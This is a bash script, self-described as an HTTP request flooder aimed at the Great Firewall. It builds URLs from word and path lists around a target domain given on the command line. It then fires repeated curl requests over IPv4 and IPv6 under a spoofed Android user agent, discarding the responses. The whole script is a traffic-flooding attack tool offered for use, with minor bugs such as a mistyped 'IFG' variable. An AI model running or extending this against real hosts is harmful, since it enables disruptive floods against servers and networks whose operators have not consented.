#!/bin/bash

echo "cURLWall: HTTP request flooder for Great Firewall"
echo "Version 0.1.0"
echo "Starting..."
sleep 2s

addr=$1
pathFile=path.txt
lexiconFile=lexicon.txt
userAgent="Dalvik/1.1"
stay=1
timeout=1

function updRand {
	let junk1=$RANDOM*32768+$RANDOM
	let junk2=$RANDOM*32768+$RANDOM
}

if [ "$1" == "" ] ; then
	echo "cURLWall cannot launch: no specified address."
fi

if [ "$1" != "" ] ; then
	echo "Targeted host: $addr"
	echo "Reading from files..."
	while IFS= read -r lexicon; do
		while IFG= read -r path; do
			clear
			pathText=""
			pathText=${path//(lexicon)/$lexicon}
			urlText=${pathText//(domain)/$addr}
			let stay=$RANDOM/8192
			echo "User agent: $userAgent"
			echo "Accessing: $urlText"
			echo "Targeted host: $addr"
			echo "Wait: $timeout second(s). Stay: $stay second(s)."
			echo ""
			curl -GA "$userAgent" -4m $stay --connect-timeout $timeout "$urlText">/dev/null
			curl -GA "$userAgent" -6m $stay --connect-timeout $timeout "$urlText">/dev/null
		done < ./$pathFile
	done < ./$lexiconFile
	echo "Job complete."
fi

echo "Terminating..."
exit